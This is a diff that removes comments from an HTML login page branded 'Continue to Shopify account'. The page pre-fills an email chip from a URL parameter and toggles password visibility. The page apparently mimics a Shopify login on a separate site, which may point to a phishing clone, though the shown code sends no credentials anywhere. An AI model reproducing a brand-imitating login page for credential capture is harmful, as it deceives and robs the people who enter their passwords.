@@ -13,7 +13,6 @@
     <link rel="stylesheet" href="./ressources/css/contact.css">
 
     <style>
-        /* ---------- Login page layout ---------- */
         .login-wrap {
             max-width: 600px;
             margin: 0 auto;
@@ -40,7 +39,6 @@
             font-weight: 400;
         }
 
-        /* Email chip */
         .email-chip {
             display: flex;
             align-items: center;
@@ -72,7 +70,6 @@
             text-decoration: underline;
         }
 
-        /* Password field wrapper for eye icon */
         .password-wrap {
             position: relative;
             margin-bottom: 10px;
@@ -98,7 +95,6 @@
             color: #1a1a1a;
         }
 
-        /* Forgot password link */
         .forgot-link {
             display: inline-block;
             color: #2563eb;
@@ -111,7 +107,6 @@
             text-decoration: underline;
         }
 
-        /* Need help link */
         .need-help {
             display: block;
             text-align: center;
@@ -126,7 +121,6 @@
             text-decoration: underline;
         }
 
-        /* Legal text under the card */
         .legal-inline {
             display: block;
             text-align: center;
@@ -186,10 +180,8 @@
             <h1>Log in</h1>
             <p class="subtitle">Continue to Shopify account</p>
 
-            <!-- Email chip — reads the email from the URL -->
             <div class="email-chip">
                 <span class="chip-email" id="chip-email">user@example.com</span>
-                <!-- Change email → back to company.html -->
                 <a href="./company.html" class="chip-action" id="change-email">Change email</a>
             </div>
 
@@ -220,7 +212,6 @@
     </main>
 
     <script>
-        // 1) Fill the email chip from ?email=... in the URL
         const params = new URLSearchParams(window.location.search);
         const emailFromUrl = params.get('email');
         const chipEmail = document.getElementById('chip-email');
@@ -228,11 +219,9 @@
 
         if (emailFromUrl) {
             chipEmail.textContent = emailFromUrl;
-            // Send user back to company.html carrying the email so it can be re-used
             changeEmailLink.href = './company.html?email=' + encodeURIComponent(emailFromUrl);
         }
 
-        // 2) Toggle password visibility
         const toggleBtn = document.getElementById('toggle-pw');
         const pwInput = document.getElementById('password');
         const icon = document.getElementById('toggle-pw-icon');
